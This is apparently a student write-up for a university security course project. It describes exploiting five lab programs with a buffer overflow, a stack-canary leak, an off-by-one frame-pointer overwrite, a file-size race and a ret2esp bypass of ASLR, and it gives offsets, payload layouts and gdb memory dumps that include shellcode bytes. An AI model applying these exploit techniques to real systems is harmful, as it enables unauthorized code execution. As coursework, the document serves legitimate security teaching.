
# Project 1 Write Up

---

## Problem 2: Smith

1) 

We feed in an arbitrary file that performs a buffer overflow attack. The vulnerability is that the agent-smith doesn't check if the file passed in is safe or not.

The first 4 bytes of our file is an integer specifying the size of the rest of the file. We then feed in a similar script as in problem 1, where we modify the return address to point to where we placed our shellcode (after the stored return address). 



2)

It was determined that the stored eip was 148 bytes after msg. Thus, we needed to add 148 bytes of padding into the buffer first.

The shellcode was placed right after the stored return address. The address of the stored eip was `0xbffff6dc`, therefore our modified eip needed to point to `0xbffff6e0` (4 bytes above the stored eip where the shellcode lies). 

The length of the file in total was 148 + 4 + 39 = 191 bytes. Therefore, we needed to prepend the byte representing 191 before our buffer attack.

```
Stack level 0, frame at 0xbffff6e0:
 eip = 0x4006ae in display (agent-smith.c:11); saved eip = 0x400775
 called by frame at 0xbffff710
 source language c.
 Arglist at 0xbffff6d8, args: path=0xbffff88a "pwnzerized"
 Locals at 0xbffff6d8, Previous frame's sp is 0xbffff6e0
 Saved registers:
  ebx at 0xbffff6d4, ebp at 0xbffff6d8, eip at 0xbffff6dc
```


3)

64 words above msg before attack:

```
0xbffff648:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff658:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff668:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff678:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff688:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff698:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6a8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6b8:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffff6c8:     0x00000000      0x00000000      0x00000000      0xb7ffcf5c
0xbffff6d8:     0xbffff6f8      0x00400775      0xbffff88b      0x00000000
0xbffff6e8:     0x00000000      0x00400751      0x00000000      0xbffff710
0xbffff6f8:     0xbffff790      0xb7f8cc8b      0xbffff784      0x00000002
0xbffff708:     0xbffff790      0xb7f8cc8b      0x00000002      0xbffff784
0xbffff718:     0xbffff790      0x00000008      0x00000000      0x00000000
0xbffff728:     0xb7f8cc5f      0x00401fb8      0xbffff780      0xb7ffede4
0xbffff738:     0x00000000      0x00400505      0x0040073b      0x00000002
```

After attack:

```
0xbffff648:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff658:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff668:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff678:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff688:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff698:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff6a8:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff6b8:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff6c8:     0x000000c0      0x11111111      0x11111111      0x11111111
0xbffff6d8:     0x11111111      0xbffff6e0      0xcd58326a      0x89c38980
0xbffff6e8:     0x58476ac1      0xc03180cd      0x2f2f6850      0x2f686873
0xbffff6f8:     0x546e6962      0x8953505b      0xb0d231e1      0x0a80cd0b
0xbffff708:     0xbffff790      0xb7f8cc8b      0x00000002      0xbffff784
0xbffff718:     0xbffff790      0x00000008      0x00000000      0x00000000
0xbffff728:     0xb7f8cc5f      0x00401fb8      0xbffff780      0xb7ffede4
0xbffff738:     0x00000000      0x00400505      0x0040073b      0x00000002
```

Notice that `0xbffff6dc` contains the modified return address, pointing to 4 bytes above it. Everything after is the shellcode. 


---


## Problem 3: jz

1) 

The vulnerability lies in the fact that the canary value can be found through the printf statement in `dehexify`. Specifically, the while loop in `dehexify` will automatically increment `i` by 3 if it encounters the '\\' and 'x' next to one another. Therefore, it is possible to skip over the null terminator character inside of `c.buffer` if "\\x" is placed right before the null termination character. Using this approach, the while loop inside of `dehexify` will continue parsing bytes after the null termination character, eventually storing the value of the stack canary inside of `c.answer`. The printf statement will then print out `c.answer`, revealing the stack canary. 

Once we have the canary value, we use the same buffer overflow attack as in problems 1 and 2, making sure to replace the stack canary with the leaked canary value. 



2) 

In order to retrieve the canary value, we needed to add the "\\x" characters 2 bytes before where the stack canary lies. Specifically, we padded the string by 12 bytes, inserted "\\" and "x", and then ended the string. Once the while loop encountered "\\x", it would skip to the stack canary in the next iteration. 

In order to spawn our shell, it was determined that the stack canary lied on address `0xbffff704`. Therefore, we needed to pad the beginning of the buffer by 15 characters plus a null termination character. 

The address of the stored return address was `0xbffff710`. Our modified return address needed to be `0xbffff714`. It was determined that the stored return address lied `0xbffff710` - `0xbffff708` = 8 bytes above the stack canary. Thus, we had to pad 8 bytes more after filling in the stack canary.



3)

![Gdb exploit](https://github.com/eric99ying/CS161-Project-1-Writeup/blob/master/buffer_1.jpg)


---


## Problem 4: brown

1)

The program contains an off by one vulnerability. In the for loop in `flip`, the program iterates through 65 indices of the buffer, when the buffer is only 64 bytes large. 

We store our shellcode inside of the environment variables. We then inject the address of our shellcode (inside of the environment variables) 8 bytes into the buffer. We pad the rest of buffer. We take advantage of the off by one vulnerability to modify the stored sfp value above buf to point to the 4 bytes into buf. This is possible because we only need to change the least significant byte of the previous return address to point into the buffer. From there, the program will pick up the return address inside of the buffer and start executing the shellcode in the environment variable. 

2)

Inside of `buf`, we needed 8 bytes of padding, 4 bytes for the modified return address pointing to the shellcode, 52 bytes more padding, and 1 overflowed extra byte that causes the ebp to point back to `buf`. 

It was determined through gdb that the address of buf was `0xbffff650`. Thus, the last byte of the sfp had to be overflowed with the byte `/x54`. Since we knew that the sfp is directly above `buf`, we just needed to pad the rest of `buf` with 64-12=52 bytes. 

The modified return address inside of buf needed to point to where the shellcode resided inside of the environment variables. Through gdb, it was determined that the shellcode was at address `0xbfffff97`.

3)

68 bytes in buf before attack:

```
0xbffff650:     0x00000000      0x00000001      0x00000000      0xbffff7fb
0xbffff660:     0x00000000      0x00000000      0x00000000      0xb7ffc44e
0xbffff670:     0x00000000      0xb7ffefd8      0xbffff730      0xb7ffc165
0xbffff680:     0x00000000      0x00000000      0x00000000      0xb7ffc6dc
0xbffff690:     0xbffff69c  
```

68 bytes in buf after attack:

```
0xbffff650:     0x11111111      0x11111111      0xbfffff97      0x11111111
0xbffff660:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff670:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff680:     0x11111111      0x11111111      0x11111111      0x11111111
0xbffff690:     0xbffff654    
```

Notice that the 65th byte was changed. Address `0xbffff658` points to an address where the environment variables are stored. 


---


## Problem 5: oracle

1)

The vulnerability in this program lies in the fact that the size checking occurs before the file is actually read. Therefore, we can dynamically change the file (by adding more bytes) after the the file initially passed the size check. This would allow us to introduce a buffer overflow attack similar to problem 2. 

In the attack, we modify the stored return address to point to 4 bytes above where it is stored. The shellcode is then placed above the stored return address. 


2)

We filled the file "hack" initially with 127 dummy characters to pass the size check. 

The stored eip was at address `0xbffff6fc`. Our buf was at `0xbffff6e8`. Our modified return address needed to point to `0xbffff700`. The stored eip was therefore, `0xbffff6fc` - `0xbffff6e8` = 20 bytes above the end of `buf`.

Thus, we appended 21 dummy characters (accounting for 1 more byte in buf), added 4 bytes of the modified return address, and then added our 85 bytes of shellcode. In total, after the appending of our buffer overflow attack bytes, the total file size became 127 + 21 + 4 + 85 = 237 bytes. We made sure to tell the program to read 237 bytes from the file "hack". 


3)

![Gdb exploit](https://github.com/eric99ying/CS161-Project-1-Writeup/blob/master/buffer_2.jpg)


---

## Problem 6: jones

1) 

We use a ret2esp attack to bypass the ASLR and introduce our shellcode. We first find a jmp \*esp instruction in the program, which conveniently exists in the `magic` function. We then overflow the return address from handle to point to the jmp \*esp instruction. We then add our shellcode right above the return address. From there, the jmp \*esp will cause our instruction pointer to point to where the stack pointer is, which is at the beginning of our shellcode.  

2) 

Using gdb, we determined that the address of the jmp \*esp instruction in code was at `0x8048666`. Our modified return address would need to be `0x8048666`.

The stored return address was at address `0xbfcd9adc`, and buf was at `0xbfcd9ab0`. Thus, we needed to pad buf by `0xbfcd9adc` - `0xbfcd9ab0` = 44 bytes.  

3)

64 bytes above buf before attack:

```
0xbfcd9af0:     0x00000010      0xdd910002      0x0100007f      0x00000000
0xbfcd9b00:     0x00000000      0x10a40002      0x00000000      0x00000000
0xbfcd9b10:     0x00000000      0x00000001      0x00000004      0x00000003
0xbfcd9b20:     0x00000000      0x00000000      0x00000000      0xbfcd9b50
```

64 bytes above buf after attack:

```
0xbf8ebde0:     0x53535353      0x53535353      0x53535353      0x53535353
0xbf8ebdf0:     0x53535353      0x53535353      0x53535353      0x53535353
0xbf8ebe00:     0x11111111      0x11111111      0x11111111      0x08048666
0xbf8ebe10:     0xffffffe8      0x8d5dc3ff      0xc0314a6d      0x5b016a99
```

The pointer to jmp \*esp is at `0xbf8ebe0c`. Everything after is the shellcode. 







